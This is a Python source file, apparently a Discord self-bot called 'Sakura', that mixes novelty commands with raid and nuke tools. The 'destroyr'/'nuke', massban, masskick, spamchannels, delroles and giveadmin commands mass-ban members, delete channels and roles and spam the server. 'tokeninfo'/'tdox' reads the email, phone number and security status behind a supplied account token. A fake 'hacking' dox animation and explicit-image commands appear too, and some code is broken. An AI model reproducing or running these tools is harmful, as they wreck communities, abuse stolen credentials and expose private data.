            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")





@Sakura.command()
async def whois(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    if isinstance(ctx.message.channel, discord.Guild):
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Registered", value=user.created_at.strftime(date_format))
        em.add_field(name="Joined", value=user.joined_at.strftime(date_format))
        members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
        em.add_field(name="Join position", value=str(members.index(user) + 1))
        if len(user.roles) > 1:
            role_string = ' '.join([r.mention for r in user.roles][1:])
            em.add_field(name="Roles [{}]".format(len(user.roles) - 1), value=role_string, inline=False)
        perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
        em.add_field(name="Permissions", value=perm_string, inline=False)
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em)
    else:
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Created", value=user.created_at.strftime(date_format))
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em)


@Sakura.command(aliases=['del', 'quickdel'])
async def quickdelete(ctx, *, args):
    await ctx.message.delete()
    await ctx.send(args, delete_after=1)


@Sakura.command()
async def minesweeper(ctx, size: int = 5):
    await ctx.message.delete()
    size = max(min(size, 8), 2)
    bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]
    is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
    has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
    message = "**Click to play**:\n"
    for y in range(size):
        for x in range(size):
            tile = "||{}||".format(chr(11036))
            if has_bomb(x, y):
                tile = "||{}||".format(chr(128163))
            else:
                count = 0
                for xmod, ymod in m_offets:
                    if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
                        count += 1
                if count != 0:
                    tile = "||{}||".format(m_numbers[count - 1])
            message += tile
        message += "\n"
    await ctx.send(message)





@Sakura.command()
async def ghost(ctx):
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file" + Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/Transparent.png', 'rb') as f:
            try:
                await Sakura.user.edit(password=password, username="ٴٴٴٴ", avatar=f.read())
            except discord.HTTPException as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)




@Sakura.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token):
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
            '%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {
            'Authorization': "Bot " + _token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
                '%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(
                description=f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
            fields = [
                {'name': 'Flags', 'value': res['flags']},
                {'name': 'Local language', 'value': res['locale'] + f"{language}"},
                {'name': 'Verified', 'value': res['verified']},
            ]
            for field in fields:
                if field['value']:
                    em.add_field(name=field['name'], value=field['value'], inline=False)
                    em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
            return await ctx.send(embed=em)
        except KeyError:
            await ctx.send("Invalid token")
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
    # em.set_footer(text=_token)
    nitro_type = "None"
    if "premium_type" in res:
        if res['premium_type'] == 2:
            nitro_type = "Nitro Premium"
        elif res['premium_type'] == 1:
            nitro_type = "Nitro Classic"
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA', 'value': res['mfa_enabled']},
        {'name': 'Verified', 'value': res['verified']},
        {'name': 'Nitro', 'value': nitro_type},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)


@Sakura.command(aliases=['copyguild', 'copyserver'])
async def copy2(ctx):  # b'\xfc'
    await ctx.message.delete()
    await Sakura.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in Sakura.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
    try:
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass


@Sakura.command()
async def poll(ctx, *, arguments):
    await ctx.message.delete()
    message = discord.utils.escape_markdown(arguments[str.find(arguments, "msg:"):str.find(arguments, "1:")]).replace(
        "msg:", "")
    option1 = discord.utils.escape_markdown(arguments[str.find(arguments, "1:"):str.find(arguments, "2:")]).replace(
        "1:", "")
    option2 = discord.utils.escape_markdown(arguments[str.find(arguments, "2:"):]).replace("2:", "")
    message = await ctx.send(f'`Poll: {message}\nA: {option1}\nB: {option2}`')
    await message.add_reaction('🅰')
    await message.add_reaction('🅱')


@Sakura.command()
async def massmention(ctx, *, message=None):
    await ctx.message.delete()
    if len(list(ctx.guild.members)) >= 50:
        userList = list(ctx.guild.members)
        random.shuffle(userList)
        sampling = random.choices(userList, k=50)
        if message is None:
            post_message = ""
            for user in sampling:
                post_message += user.mention
            await ctx.send(post_message)
        else:
            post_message = message + "\n\n"
            for user in sampling:
                post_message += user.mention
            await ctx.send(post_message)
    else:
        print(list(ctx.guild.members))
        if message is None:
            post_message = ""
            for user in list(ctx.guild.members):
                post_message += user.mention
            await ctx.send(post_message)
        else:
            post_message = message + "\n\n"
            for user in list(ctx.guild.members):
                post_message += user.mention
            await ctx.send(post_message)

####NUKER2 test me 
@Sakura.command(aliases=['rekt', 'nuke'])
async def destroyr(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name=RandString(),
            description="Sakura LOL",
            reason="Sakura LOL",
            icon=None,
            banner=None
        )
    except:
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name="Sakura")
    for _i in range(250):
        await ctx.guild.create_role(name="Sakura", color=RandomColor())


@Sakura.command(aliases=['banwave', 'banall', 'etb'])
async def massban(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.ban(reason="Sakura")
        except:
            pass


@Sakura.command()
async def dynoban(ctx):
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        message = await ctx.send("?ban " + member.mention)
        await message.delete()
        await asyncio.sleep(1.5)


@Sakura.command(aliases=['kickall', 'kickwave'])
async def masskick(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.kick(reason="Sakura")
        except:
            pass


@Sakura.command(aliases=['spamroles', 'massroles', 'addroles'])
async def massrole(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_role(name="Sakura", color=RandomColor(), permissions=Permissions.all())
        except:
            try:
                await ctx.guild.create_role(name="Sakura", color=RandomColor())
            except:
                return


@Sakura.command(aliases=['givemeadmin', 'giveadminrole', 'giveadminroles'])
async def giveadmin(ctx):
    await ctx.message.delete()
    for role in ctx.guild.roles:
        try:
            if role.permissions.administrator:
                await ctx.author.add_roles(role)
        except:
            pass


@Sakura.command(aliases=['masschannels', 'masschannel', 'ctc'])
async def spamchannels(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name="Sakura ontop")
        except:
            return


@Sakura.command(aliases=['delchannel'])
async def delchannels(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return


@Sakura.command(aliases=['deleteroles'])
async def delroles(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass


@Sakura.command(aliases=['purgebans', 'unbanall'])
async def massunban(ctx):
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass



@Sakura.command()
async def ping(ctx):
    await ctx.message.delete()
    before = time.monotonic()
    message = await ctx.send("Pinging...")
    ping = (time.monotonic() - before) * 1000
    await message.edit(content=f"`{int(ping)} ms`")


@Sakura.command(aliases=['guildinfo'])
async def serverinfo(ctx):
    await ctx.message.delete()
    date_format = "%a, %d %b %Y %I:%M %p"
    embed = discord.Embed(title=f"{ctx.guild.name}",
                          description=f"{len(ctx.guild.members)} Members\n {len(ctx.guild.roles)} Roles\n {len(ctx.guild.text_channels)} Text-Channels\n {len(ctx.guild.voice_channels)} Voice-Channels\n {len(ctx.guild.categories)} Categories",
                          timestamp=datetime.datetime.utcnow(), color=discord.Color.blue())
    embed.add_field(name="Server created at", value=f"{ctx.guild.created_at.strftime(date_format)}")
    embed.add_field(name="Server Owner", value=f"{ctx.guild.owner}")
    embed.add_field(name="Server Region", value=f"{ctx.guild.region}")
    embed.add_field(name="Server ID", value=f"{ctx.guild.id}")
    embed.set_thumbnail(url=f"{ctx.guild.icon_url}")
    await ctx.send(embed=em)


@Sakura.command()
async def wizz(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.TextChannel):
        print("hi")
        initial = random.randrange(0, 60)
        message = await ctx.send(f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...\nInitiating Mass-DM`")
    elif isinstance(ctx.message.channel, discord.DMChannel):
        initial = random.randrange(1, 60)
        message = await ctx.send(
            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`")
    elif isinstance(ctx.message.channel, discord.GroupChannel):
        initial = random.randrange(1, 60)
        message = await ctx.send(f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\nKicking {len(ctx.message.channel.recipients)} Users...`")


@Sakura.command(name='8ball')
async def _ball(ctx, *, question):
    await ctx.message.delete()
    responses = [
        'That is a resounding no',
        'It is not looking likely',
        'Too hard to tell',
        'It is quite possible',
        'That is a definite yes!',
        'Maybe',
        'Ask your dad or something I dont know.'
        'That question doesnt even deserve an answer'
        'you fucked something up try again'
        'There is a good chance'
    ]
    answer = random.choice(responses)
    embed = discord.Embed()
    embed.add_field(name="Question", value=question, inline=False)
    embed.add_field(name="Answer", value=answer, inline=False)
    embed.set_thumbnail(url="https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png")
    await ctx.send(embed=em)


@Sakura.command(aliases=['serverbanner'])
async def banner(ctx):
    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.banner_url)
    await ctx.send(embed=em)


@Sakura.command(aliases=['rc'])
async def renamechannels(ctx, *, name):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        await channel.edit(name=name)


@Sakura.command(aliases=['roles'])
async def getroles(ctx):
    await ctx.message.delete()
    roles = list(ctx.guild.roles)
    roles.reverse()
    roleStr = ""
    for role in roles:
        if role.name == "@everyone":
            roleStr += "@\u200beveryone"
        else:
            roleStr += role.name + "\n"
    print(roleStr)
    await ctx.send(roleStr)


@Sakura.command()
async def testban_but_with_member_ids__TEST1(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    print("Banning " + str(len(users)))
    for user in users:
        try:
            print(user.id)
        except:
            pass
    await ctx.send(str(len(users)) + " users in cache")


@Sakura.command()
async def testban(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    await ctx.send("Banning " + str(len(users)))
    for user in users:
        try:
            await ctx.guild.ban(user, reason="Sakura")
        except:
            pass



@Sakura.command(aliases=['renameserver',' nameserver'])
async def servername(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)


@Sakura.command()
async def nickall(ctx, nickname):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.edit(nick=nickname)
        except:
            pass


@Sakura.command()
async def youtube(ctx, *, search):
    await ctx.message.delete()
    query_string = parse.urlencode({'search_query': search})
    html_content = request.urlopen('http://www.youtube.com/results?' + query_string)
    search_results = re.findall('href=\"\\/watch\\?v=(.{11})', html_content.read().decode())
    await ctx.send('https://www.youtube.com/watch?v=' + search_results[0])

#this probably wont work because im a twat and this code is from the pre-beta version before it was even a project like at fuckin V0.01
    
#@Sakura.command()
#async def prefix(ctx, prefix):
#    await ctx.message.delete()
#    Sakura.command_prefix = str(prefix)


@Sakura.command()
async def abc(ctx):
    await ctx.message.delete()
    ABC = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u',
           'v', 'w', 'x', 'y', 'z']
    message = await ctx.send(ABC[0])
    await asyncio.sleep(2)
    for _next in ABC[1:]:
        await message.edit(content=_next)
        await asyncio.sleep(2)


@Sakura.command(aliases=['100'])
async def _100(ctx):
    await ctx.message.delete()
    message = ctx.send("Starting count to 100")
    await asyncio.sleep(2)
    for _ in range(100):
        await message.edit(content=_)
        await asyncio.sleep(2)




@Sakura.command(pass_context=True, aliases=['cyclename', 'autoname', 'autonick', 'cycle'])
async def cyclenick(ctx, *, text):
    await ctx.message.delete()
    global cycling
    cycling = True
    while cycling:
        name = ""
        for letter in text:
            name = name + letter
            await ctx.message.author.edit(nick=name)


@Sakura.command(aliases=['stopcyclename', 'cyclestop', 'stopautoname', 'stopautonick', 'stopcycle'])
async def stopcyclenick(ctx):
    await ctx.message.delete()
    global cycling
    cycling = False


@Sakura.command()
async def acceptfriends(ctx):
    await ctx.message.delete()
    for relationship in Sakura.user.relationships:
        if relationship == discord.RelationshipType.incoming_request:
            await relationship.accept()


@Sakura.command()
async def ignorefriends(ctx):
    await ctx.message.delete()
    for relationship in Sakura.user.relationships:
        if relationship is discord.RelationshipType.incoming_request:
            relationship.delete()


@Sakura.command()
async def delfriends(ctx):
    await ctx.message.delete()
    for relationship in Sakura.user.relationships:
        if relationship is discord.RelationshipType.friend:
            await relationship.delete()


@Sakura.command()
async def clearblocked(ctx):
    await ctx.message.delete()
    print(Sakura.user.relationships)
    for relationship in Sakura.user.relationships:
        if relationship is discord.RelationshipType.blocked:
            print(relationship)
            await relationship.delete()


@Sakura.command(aliases=['changeregions', 'changeregion', 'regionschange'])
async def regionchange(ctx, amount: int):
    await ctx.message.delete()
    if isinstance(ctx.channel, discord.GroupChannel):
        token = config.get('token')
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
        }
        indian_payload = {'region': 'india'}
        brazil_payload = {'region': 'brazil'}
        japan_payload = {'region': 'japan'}
        russian_payload = {'region': 'russia'}
        for _i in range(amount):
            requests.patch(f'https://discord.com/api/v8/channels/{ctx.channel.id}/call', json=indian_payload,headers=headers)
            await asyncio.sleep(3)
            requests.patch(f'https://discord.com/api/v8/channels/{ctx.channel.id}/call', json=brazil_payload,headers=headers)
            await asyncio.sleep(3)
            requests.patch(f'https://discord.com/api/v8/channels/{ctx.channel.id}/call', json=japan_payload,headers=headers)
            await asyncio.sleep(3)
            r = requests.patch(f'https://discord.com/api/v8/channels/{ctx.channel.id}/call', json=russian_payload,headers=headers).text
            await asyncio.sleep(3)
            print(r)


@Sakura.command()
async def kickgc(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        for recipient in ctx.message.channel.recipients:
            await ctx.message.channel.remove_recipients(recipient)


@Sakura.command(aliases=['gcleave'])
async def leavegc(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        await ctx.message.channel.leave()


@Sakura.command()
async def massreact(ctx, emote):
    await ctx.message.delete()
    messages = await ctx.message.channel.history(limit=20).flatten()
    for message in messages:
        await message.add_reaction(emote)
    


@Sakura.command()
async def sadcat(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.alexflipnote.dev/sadcat").json()
    link = str(r['file'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Sakura_sadcat.png"))
    except:
        await ctx.send(link)


@Sakura.command()
async def bird(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.alexflipnote.dev/birb").json()
    link = str(r['file'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Sakura_bird.png"))
    except:
        await ctx.send(link)


@Sakura.command()
async def hcum(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/cum")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Sakura_cumslut.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Sakura.command(aliases=["vagina"])
async def pussy(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pussy")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Sakura_pussy.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Sakura.command()
async def waifu(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/waifu")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Sakura_waifu.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)




@Sakura.command()
async def cuddle(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/cuddle")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Sakura_cuddle.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)



@Sakura.command(aliase=['leaveallgroups', 'leavegroup', 'leavegroups', 'groupleave', 'groupleaver'])
async def group_leaver(ctx):
    await ctx.message.delete()
    for channel in Sakura.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()

@Sakura.command(aliases=['stopstreaming', 'stopstatus', 'stoplistening', 'stopplaying', 'stopwatching'])
async def stopactivity(ctx):
    await ctx.message.delete()
    await Sakura.change_presence(activity=None, status=discord.Status.dnd)

@Sakura.command()
async def shrug(ctx):
    await ctx.message.delete()
    shrug = r'¯\_(ツ)_/¯'
    await ctx.send(shrug)


@Sakura.command()
async def lenny(ctx):
    await ctx.message.delete()
    lenny = '( ͡° ͜ʖ ͡°)'
    await ctx.send(lenny)


@Sakura.command(aliases=['fliptable'])
async def tableflip(ctx):
    await ctx.message.delete()
    tableflip = '(╯°□°）╯︵ ┻━┻'
    await ctx.send(tableflip)


@Sakura.command()
async def unflip(ctx):
    await ctx.message.delete()
    unflip = '┬─┬ ノ( ゜-゜ノ)'
    await ctx.send(unflip)



@Sakura.command()
async def censor(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('||' + message + '||')


@Sakura.command()
async def underline(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('__' + message + '__')


@Sakura.command()
async def italicize(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('*' + message + '*')


@Sakura.command()
async def strike(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('~~' + message + '~~')


@Sakura.command()
async def quote(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('> ' + message)


@Sakura.command()
async def code(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('`' + message + "`")


###anim###


@Sakura.command()
async def poof(ctx):
        #"""poofness"""
        list = ("(   ' - ')", "' - ')", "- ')", "')", ")", "*poofness*")
        for i in list:
            await asyncio.sleep(1.5)
            await ctx.message.edit(content=i)

@Sakura.command()
async def virus3(ctx):
        user = user or ctx.author
        list = (
            f"``[▓▓▓                    ] / {virus}-virus.exe Packing files.``",
            f"``[▓▓▓▓▓▓▓                ] - {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓           ] \ {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓         ] | {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      ] / {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ] - {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] \ {virus}-Sakura-Cockblocker.exe Packing files..``",
            f"``Successfully downloaded {virus}-virus.exe``",
            "``Injecting virus.   |``",
            "``Injecting virus..  /``",
            "``Injecting virus... -``",
            f"``Successfully Injected {virus}-virus.exe into {user.name}``",
        )
        for i in list:
            await asyncio.sleep(1.5)
            await ctx.message.edit(content=i)

@Sakura.command(aliases=['explode'])
async def boom(ctx):
        list = (
            "```THIS MESSAGE WILL SELFDESTRUCT IN 5```",
            "```THIS MESSAGE WILL SELFDESTRUCT IN 4```",
            "```THIS MESSAGE WILL SELFDESTRUCT IN 3```",
            "```THIS MESSAGE WILL SELFDESTRUCT IN 2```",
            "```THIS MESSAGE WILL SELFDESTRUCT IN 1```",
            "```THIS MESSAGE WILL SELFDESTRUCT IN 0```",
            "💣",
            "💥",
        )
        for i in list:
            await asyncio.sleep(1.5)
            await ctx.message.edit(content=i)

@Sakura.command(aliases=['tablethrow'])
async def table(ctx):
        list = (
            "`(\°-°)\  ┬─┬`",
            "`(\°□°)\  ┬─┬`",
            "`(-°□°)-  ┬─┬`",
            "`(╯°□°)╯    ]`",
            "`(╯°□°)╯     ┻━┻`",
            "`(╯°□°)╯       [`",
            "`(╯°□°)╯          ┬─┬`",
            "`(╯°□°)╯                 ]`",
            "`(╯°□°)╯                  ┻━┻`",
            "`(╯°□°)╯                         [`",
            "`(\°-°)\                               ┬─┬`",
        )
        for i in list:
            await asyncio.sleep(1.5)
